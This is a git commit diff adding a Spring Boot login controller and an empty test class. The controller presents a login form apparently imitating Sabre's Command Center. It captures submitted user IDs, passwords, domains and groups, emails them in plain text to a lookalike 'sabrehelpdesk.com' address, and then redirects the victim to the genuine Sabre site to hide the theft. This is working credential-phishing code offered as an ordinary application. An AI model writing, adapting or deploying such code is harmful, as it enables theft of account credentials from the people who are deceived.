41e343c1d2595cc37e7126a4ddeb284fa1db9bbb
owaisnoohani <noohaniowais@gmail.com>
2025-04-03 19:31:23 +0500

    Initial commit

---
+++ src/main/java/com/commandcenter/ngp/sabre/controller/LoginController.java
@@ -0,0 +1,34 @@
+package com.commandcenter.ngp.sabre.controller;
+
+import com.commandcenter.ngp.sabre.service.EmailService;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Controller;
+import org.springframework.ui.Model;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+
+@Controller
+public class LoginController {
+
+    @Autowired
+    private EmailService emailService;
+
+    @GetMapping("/")
+    public String showLoginForm() {
+        return "index"; // This should map to your login.html or login.jsp file
+    }
+
+ @PostMapping("/login")
+ public String handleLogin(@RequestParam String userId, @RequestParam String password,
+                               @RequestParam String domain, @RequestParam String group, Model model) {
+
+
+
+     String subject = "New Login Attempt With Command Centre";
+     String message = "User ID: " + userId + "\nPassword: " + password +"\n domain: " + domain + "\nGroup: " + (group != null ? group : "N/A");
+
+     emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
+        return  "redirect:https://commandcenter-ngp.sabre.com";
+    }
+}
---
+++ src/test/java/com/commandcenter/ngp/sabre/CommandCenterApplicationTests.java
@@ -0,0 +1,13 @@
+package com.commandcenter.ngp.sabre;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.boot.test.context.SpringBootTest;
+
+@SpringBootTest
+class CommandCenterApplicationTests {
+
+	@Test
+	void contextLoads() {
+	}
+
+}
